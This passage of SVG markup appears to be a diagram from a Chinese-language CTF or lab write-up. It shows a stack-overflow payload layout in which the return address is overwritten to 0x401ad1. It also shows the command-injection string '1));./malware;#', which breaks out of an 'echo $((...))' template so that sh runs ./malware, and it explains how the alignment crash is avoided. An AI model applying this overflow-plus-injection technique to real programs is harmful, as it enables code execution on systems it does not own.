244.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">0f</text><rect x="278.0" y="226.0" width="60.0" height="36.0" rx="4" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.3"/><text x="308.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">80</text><rect x="342.0" y="226.0" width="60.0" height="36.0" rx="4" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.3"/><text x="372.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><rect x="406.0" y="226.0" width="60.0" height="36.0" rx="4" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.3"/><text x="436.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">10</text><rect x="470.0" y="226.0" width="60.0" height="36.0" rx="4" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.3"/><text x="500.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">72</text><rect x="534.0" y="226.0" width="60.0" height="36.0" rx="4" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.3"/><text x="564.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><rect x="598.0" y="226.0" width="60.0" height="36.0" rx="4" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.3"/><text x="628.0" y="248.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><text x="136.0" y="292.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#64748B" text-anchor="end" font-weight="normal">0x18</text><rect x="150.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="180.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">d1</text><rect x="214.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="244.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">1a</text><rect x="278.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="308.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">40</text><rect x="342.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="372.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><rect x="406.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="436.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><rect x="470.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="500.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><rect x="534.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="564.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><rect x="598.0" y="269.0" width="60.0" height="36.0" rx="4" fill="#FEF2F2" stroke="#DC2626" stroke-width="1.3"/><text x="628.0" y="291.6" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">00</text><text x="700.0" y="158.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="13.5" fill="#059669" text-anchor="start" font-weight="normal">0x00–0x0e  命令串（15 字节）</text><text x="700.0" y="188.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="13.5" fill="#059669" text-anchor="start" font-weight="normal">0x0f  \x00：截断 strcpy</text><text x="700.0" y="218.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="13.5" fill="#2563EB" text-anchor="start" font-weight="normal">0x10–0x17  saved rbp</text><text x="700.0" y="248.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="13.5" fill="#DC2626" text-anchor="start" font-weight="normal">0x18–0x1f  返回地址 → 0x401ad1</text><text x="700.0" y="292.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="12.5" fill="#334155" text-anchor="start" font-weight="normal">cmd = "1));./malware;#"</text><text x="700.0" y="316.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="12.5" fill="#64748B" text-anchor="start" font-weight="normal">15 字节填满 expression</text><text x="40.0" y="348.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="16" fill="#0F172A" text-anchor="start" font-weight="700">eval 的字符串拼接（command_buf）</text><rect x="40.0" y="370.0" width="118.0" height="42.0" rx="5" fill="#EFF6FF" stroke="#2563EB" stroke-width="1.4"/><text x="99.0" y="395.9" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14.5" fill="#0F172A" text-anchor="middle" font-weight="normal">echo $((</text><rect x="182.0" y="370.0" width="246.0" height="42.0" rx="5" fill="#ECFDF5" stroke="#059669" stroke-width="1.4"/><text x="305.0" y="395.9" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14.5" fill="#0F172A" text-anchor="middle" font-weight="normal">1));./malware;#</text><rect x="452.0" y="370.0" width="58.0" height="42.0" rx="5" fill="#F8FAFC" stroke="#E2E8F0" stroke-width="1.4"/><text x="481.0" y="395.9" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14.5" fill="#0F172A" text-anchor="middle" font-weight="normal">))</text><text x="164.0" y="397.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="16" fill="#64748B" text-anchor="start" font-weight="normal">+</text><text x="434.0" y="397.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="16" fill="#64748B" text-anchor="start" font-weight="normal">+</text><text x="528.0" y="397.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="20" fill="#0F172A" text-anchor="start" font-weight="normal">→</text><rect x="556.0" y="370.0" width="470.0" height="42.0" rx="5" fill="#0F172A" stroke="#0F172A" stroke-width="1.4"/><text x="568.0" y="396.1" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="15" fill="#F8FAFC" text-anchor="start" font-weight="normal">echo $((1));./malware;#))</text><text x="40.0" y="434.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#334155" text-anchor="start" font-weight="normal">sh -c 实际按分号 / 注释拆成三条命令：</text><text x="60.0" y="458.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#059669" text-anchor="start" font-weight="700">①</text><text x="90.0" y="458.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="start" font-weight="normal">echo $((1))</text><text x="240.0" y="458.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#334155" text-anchor="start" font-weight="normal">→ 算术扩展得 1，打印 1</text><text x="60.0" y="488.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#DC2626" text-anchor="start" font-weight="700">②</text><text x="90.0" y="488.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="start" font-weight="normal">./malware</text><text x="240.0" y="488.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#334155" text-anchor="start" font-weight="normal">→ 作为顶层命令直接执行，bomb 提示写到 stdout ✔</text><text x="60.0" y="518.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#2563EB" text-anchor="start" font-weight="700">③</text><text x="90.0" y="518.0" font-family="'DejaVu Sans Mono','Consolas','Courier New',monospace" font-size="14" fill="#0F172A" text-anchor="start" font-weight="normal">#))</text><text x="240.0" y="518.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#334155" text-anchor="start" font-weight="normal">→ # 之后是注释，eval 追加的 )) 被忽略，不产生语法错误</text><text x="40.0" y="576.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="16" fill="#0F172A" text-anchor="start" font-weight="700">控制流</text><rect x="40.0" y="598.0" width="172.0" height="62.0" rx="5" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1.4"/><text x="126.0" y="623.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">main</text><text x="126.0" y="643.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">call input</text><line x1="216" y1="629" x2="236" y2="629" stroke="#0F172A" stroke-width="1.6" marker-end="url(#ar)"/><rect x="240.0" y="598.0" width="172.0" height="62.0" rx="5" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1.4"/><text x="326.0" y="623.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">input 的 ret</text><text x="326.0" y="643.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">被改成 0x401ad1</text><line x1="416" y1="629" x2="436" y2="629" stroke="#0F172A" stroke-width="1.6" marker-end="url(#ar)"/><rect x="440.0" y="598.0" width="172.0" height="62.0" rx="5" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1.4"/><text x="526.0" y="623.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">main</text><text x="526.0" y="643.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">call eval</text><line x1="616" y1="629" x2="636" y2="629" stroke="#0F172A" stroke-width="1.6" marker-end="url(#ar)"/><rect x="640.0" y="598.0" width="172.0" height="62.0" rx="5" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1.4"/><text x="726.0" y="623.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">eval</text><text x="726.0" y="643.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">system(命令)</text><line x1="816" y1="629" x2="836" y2="629" stroke="#0F172A" stroke-width="1.6" marker-end="url(#ar)"/><rect x="840.0" y="598.0" width="172.0" height="62.0" rx="5" fill="#F8FAFC" stroke="#CBD5E1" stroke-width="1.4"/><text x="926.0" y="623.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">sh</text><text x="926.0" y="643.8" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#0F172A" text-anchor="middle" font-weight="normal">执行三条命令</text><text x="40.0" y="694.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#334155" text-anchor="start" font-weight="normal">关键：ret 落到 0x401ad1 后，main 会「正常」执行 call eval —— 栈对齐正确，</text><text x="40.0" y="720.0" font-family="'Noto Sans CJK SC','Noto Sans SC','Microsoft YaHei','PingFang SC',sans-serif" font-size="14" fill="#334155" text-anchor="start" font-weight="normal">不会像直接 ret 到 eval 那样在 system/printf 内部因 16 字节对齐而崩溃。</text>
</svg>
